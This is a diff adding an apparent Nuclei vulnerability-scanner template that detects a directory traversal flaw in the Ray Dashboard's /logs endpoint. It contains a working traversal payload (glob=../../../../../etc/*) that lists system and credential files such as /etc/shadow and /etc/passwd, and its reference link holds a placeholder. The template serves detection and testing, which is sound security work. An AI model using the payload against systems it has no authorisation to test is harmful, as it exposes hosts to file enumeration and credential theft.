@@ -1,0 +1,55 @@
+id: ray-dashboard-directory-traversal
+
+info:
+  name: Ray Dashboard - Directory Traversal
+  author: tomorrow9913, gy741, Mooncastlejun, greyhawk16, clastkr
+  severity: high
+  description: |
+    A Directory Traversal vulnerability in the Ray Dashboard allows enumeration of the host file system by traversing the path used in the glob parameter of the /logs endpoint.
+  reference:
+    - https://github.com/ray-project/ray/issues/issue_number
+  tags:
+    - web
+    - directory traversal
+    - ray
+    - dashboard
+  classification:
+    cwe-id: CWE-29
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nodes?view=summary"
+    
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '"nodeLogicalResources":\s*{"([^"]+)"'
+        name: node_id
+    
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v0/logs?node_id={{node_id}}&glob=../../../../../etc/*"
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "etc/shadow"
+          - "etc/passwd"
+          - "etc/group"
+        condition: and
+      
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
